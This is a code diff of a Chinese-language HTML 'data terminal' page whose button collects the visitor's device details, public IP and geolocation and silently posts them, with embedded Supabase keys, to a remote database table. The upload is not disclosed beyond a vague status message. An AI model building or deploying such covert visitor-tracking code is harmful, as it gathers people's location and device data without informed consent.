@@ -2,154 +2,152 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <title>▲ 朱子硕数据终端 ▲</title>
+    <title>▲ 精密数据终端 - 朱子硕 ▲</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         :root {
-            --黑金: linear-gradient(30deg, #4a3c2a 0%, #d4af37 100%);
-            --玄铁黑: #1a1a1a;
-            --金属边纹: 0 0 15px rgba(212, 175, 55, 0.2);
+            --金属黑: #1a1a1a;
+            --金纹: #d4af3780;
+            --镌刻金: #9c8412;
         }
 
         body {
-            background: 
-                radial-gradient(circle at 50% 100%, 
-                    rgba(212, 175, 55, 0.05) 0%, 
-                    rgba(0, 0, 0, 0.95) 70%),
-                linear-gradient(
-                    45deg,
-                    var(--玄铁黑) 30%,
-                    #2d2d2d 100%
-                );
+            background: var(--金属黑);
             min-height: 100vh;
             margin: 0;
             font-family: 'Noto Serif SC', serif;
             color: #d4af99;
-            position: relative;
             overflow-x: hidden;
         }
 
-        .终端面板 {
-            border: 2px solid;
-            border-image: var(--黑金) 1;
-            margin: 2rem;
-            padding: 2rem;
-            background: rgba(26, 26, 26, 0.9);
-            position: relative;
-            box-shadow: var(--金属边纹);
+        .终端界面 {
+            padding: 1.5rem;
+            background: linear-gradient(145deg, #1a1a1a 0%, #2d2d2d 100%);
+            border: 1px solid var(--金纹);
+            margin: 1rem;
+            box-shadow: 0 3px 15px rgba(0,0,0,0.3);
         }
 
-        @media (max-width: 768px) {
-            .终端面板 {
-                margin: 1rem;
-                padding: 1rem;
-                border-width: 1px;
-            }
-
-            .数据矩阵 {
-                grid-template-columns: 1fr;
-            }
-
-            .操作按钮 {
-                padding: 1.2rem;
-                width: 100%;
-            }
-        }
-
-        .数据矩阵 {
+        .数据区块 {
             display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 1.5rem;
+            grid-template-columns: 1fr;
+            gap: 1.2rem;
             margin: 2rem 0;
         }
 
         .数据单元 {
-            background: linear-gradient(145deg, #2a2a2a 0%, #1a1a1a 100%);
-            padding: 1.5rem;
-            border-left: 3px solid #d4af3780;
+            padding: 1.2rem;
+            background: rgba(26,26,26,0.9);
+            border-left: 3px solid var(--镌刻金);
             position: relative;
-            overflow: hidden;
         }
 
-        .数据单元::before {
+        .数据单元::after {
             content: "";
             position: absolute;
-            inset: 0;
-            background: repeating-linear-gradient(
-                45deg,
-                transparent 0px,
-                transparent 15px,
-                #d4af3710 16px
-            );
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, var(--金纹), transparent);
         }
 
         .操作按钮 {
-            background: var(--黑金);
-            border: none;
-            padding: 1rem 2.5rem;
-            color: #2a2a2a;
-            font-family: inherit;
-            font-weight: 600;
-            letter-spacing: 1px;
-            cursor: pointer;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-        }
-
-        .操作按钮:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(212, 175, 55, 0.3);
-        }
-
-        .操作员标识 {
-            position: fixed;
-            bottom: 30px;
-            right: 30px;
+            background: none;
+            border: 2px solid var(--镌刻金);
+            padding: 1rem;
+            width: 100%;
+            color: #d4af99;
             font-size: 1.1em;
-            background: linear-gradient(90deg, #d4af37, #9c8412);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            text-shadow: 0 2px 5px rgba(0,0,0,0.2);
+            letter-spacing: 2px;
+            transition: all 0.3s;
+        }
+
+        .操作按钮:active {
+            background: rgba(212,175,55,0.1);
+        }
+
+        @media (min-width: 768px) {
+            .终端界面 { margin: 2rem 15%; }
+            .数据区块 { grid-template-columns: repeat(2,1fr); }
+        }
+
+        .状态提示 {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(26,26,26,0.95);
+            padding: 12px 24px;
+            border: 1px solid var(--金纹);
+            color: #d4af37;
+            font-family: monospace;
+            z-index: 1000;
         }
     </style>
 </head>
 <body>
-    <div class="终端面板">
-        <div class="数据矩阵" id="dataDisplay">
-            <!-- 数据动态加载 -->
+    <div class="终端界面">
+        <div class="数据区块" id="dataDisplay">
+            <div class="数据单元">
+                <h3>时间戳</h3>
+                <pre id="timestamp">2025/4/28 19:46:12</pre>
+            </div>
+            
+            <div class="数据单元">
+                <h3>硬件概要</h3>
+                <pre id="hardware">操作系统：加载中...
+处理器核：加载中...
+内存容量：加载中...
+屏幕规格：加载中...</pre>
+            </div>
+
+            <div class="数据单元">
+                <h3>网络特征</h3>
+                <pre id="network">IP地址：扫描中...</pre>
+            </div>
+
+            <div class="数据单元">
+                <h3>地理坐标</h3>
+                <pre id="geo">纬度：等待授权...
+经度：等待授权...</pre>
+            </div>
         </div>
 
-        <div style="text-align:center">
-            <button class="操作按钮" onclick="启动深度采集()">启 动 深 度 采 集</button>
-        </div>
-
-        <div class="操作员标识">首席分析师 · 朱子硕</div>
+        <button class="操作按钮" onclick="启动深度采集()">启 动 深 度 采 集</button>
+        <div class="分析师标识">首席分析师 · 朱子硕</div>
     </div>
 
     <script>
         // Supabase配置
-        const SUPABASE_端点 = 'https://ycqfchdeeyrptchzgjgh.supabase.co';
-        const SUPABASE_密钥 = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InljcWZjaGRlZXlycHRjaHpnamdoIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDU4Mzk2MzksImV4cCI6MjA2MTQxNTYzOX0.nf9ZJe_CgKTqQofoITAfK7JXDXf_yglc4_tX1Clp_mY';
+        const SUPABASE_ENDPOINT = 'https://yfuljidnzljfklkmuupb.supabase.co';
+        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlmdWxqaWRuemxqZmtsa211dXBiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDU4MDM5MzEsImV4cCI6MjA2MTM3OTkzMX0.UHoW7xKPOEENYe1PueTrNpeWIumPusgj8FEkxoaQJpo';
 
         // 精密数据采集
         const 获取设备指纹 = async () => {
-            const 指纹数据 = {
+            const 数据模板 = {
                 时间戳: new Date().toLocaleString('zh-CN'),
-                硬件概要: {
+                硬件: {
                     操作系统: navigator.platform,
-                    处理器核心: navigator.hardwareConcurrency,
+                    处理器核: navigator.hardwareConcurrency,
                     内存容量: `${navigator.deviceMemory || '未知'}GB`,
                     屏幕规格: `${screen.width}×${screen.height}@${screen.pixelDepth}位`
                 },
-                网络特征: await (async () => {
-                    try {
-                        const IP响应 = await fetch('https://api.ipify.org?format=json');
-                        return await IP响应.json();
-                    } catch {
-                        return { IP地址: '受保护' }
-                    }
-                })(),
-                地理坐标: await new Promise(resolve => {
+                网络: { IP地址: '扫描中...' },
+                地理坐标: { 纬度: null, 经度: null }
+            };
+
+            try {
+                const ip响应 = await fetch('https://api.ipify.org?format=json');
+                const ip数据 = await ip响应.json();
+                数据模板.网络.IP地址 = ip数据.ip;
+                document.getElementById('network').textContent = `IP地址：${ip数据.ip}`;
+            } catch {
+                document.getElementById('network').textContent = 'IP地址：受保护';
+            }
+
+            try {
+                const 地理数据 = await new Promise(resolve => {
                     navigator.geolocation.getCurrentPosition(
                         pos => resolve({
                             纬度: pos.coords.latitude.toFixed(4),
@@ -157,66 +155,53 @@
                         }),
                         () => resolve(null)
                     )
-                })
-            };
+                });
+                if(地理数据) {
+                    数据模板.地理坐标 = 地理数据;
+                    document.getElementById('geo').textContent = 
+                        `纬度：${地理数据.纬度}\n经度：${地理数据.经度}`;
+                }
+            } catch {}
 
-            // 提交到安全终端
+            return 数据模板;
+        };
+
+        // 数据提交
+        const 提交数据 = async (数据) => {
             try {
-                await fetch(`${SUPABASE_端点}/rest/v1/zzs_records`, {
+                await fetch(`${SUPABASE_ENDPOINT}/rest/v1/device_records`, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
-                        'apikey': SUPABASE_密钥,
-                        'Authorization': `Bearer ${SUPABASE_密钥}`
+                        'apikey': SUPABASE_KEY,
+                        'Authorization': `Bearer ${SUPABASE_KEY}`
                     },
                     body: JSON.stringify({
-                        设备指纹: 指纹数据,
-                        地理位置: 指纹数据.地理坐标
+                        operator: '朱子硕',
+                        ...数据
                     })
                 });
-                显示传输状态('▲ 数据安全通道已建立 ▲');
+                显示状态('▲ 数据安全通道已建立 ▲');
             } catch (error) {
-                显示传输状态('⚠ 信道干扰 - 请重试');
+                显示状态('⚠ 量子信道干扰 - 请重试');
             }
-
-            return 指纹数据;
-        };
-
-        // 动态渲染界面
-        const 渲染数据视图 = (数据) => {
-            const 容器 = document.getElementById('dataDisplay');
-            容器.innerHTML = Object.entries(数据).map(([键, 值]) => `
-                <div class="数据单元">
-                    <h3>${键.toUpperCase()}</h3>
-                    <pre>${JSON.stringify(值, null, 2)}</pre>
-                </div>
-            `).join('');
         };
 
         // 状态反馈
-        const 显示传输状态 = (文本) => {
-            const 状态弹窗 = document.createElement('div');
-            状态弹窗.style = `
-                position: fixed;
-                top: 20px;
-                left: 50%;
-                transform: translateX(-50%);
-                padding: 12px 24px;
-                background: rgba(26,26,26,0.9);
-                border: 1px solid #d4af3780;
-                color: #d4af37;
-                font-family: monospace;
-                box-shadow: 0 3px 10px rgba(0,0,0,0.3);
-            `;
-            状态弹窗.textContent = 文本;
-            document.body.appendChild(状态弹窗);
-            setTimeout(() => 状态弹窗.remove(), 3000);
+        const 显示状态 = (文本) => {
+            const 提示框 = document.createElement('div');
+            提示框.className = '状态提示';
+            提示框.textContent = 文本;
+            document.body.appendChild(提示框);
+            setTimeout(() => 提示框.remove(), 3000);
         };
 
-        // 初始化执行
+        // 执行流程
         const 启动深度采集 = async () => {
-            const 采集结果 = await 获取设备指纹();
-            渲染数据视图(采集结果);
+            const 数据 = await 获取设备指纹();
+            document.getElementById('hardware').textContent = 
+                `操作系统：${数据.硬件.操作系统}\n处理器核：${数据.硬件.处理器核}\n内存容量：${数据.硬件.内存容量}\n屏幕规格：${数据.硬件.屏幕规格}`;
+            await 提交数据(数据);
         };
     </script>
 </body>
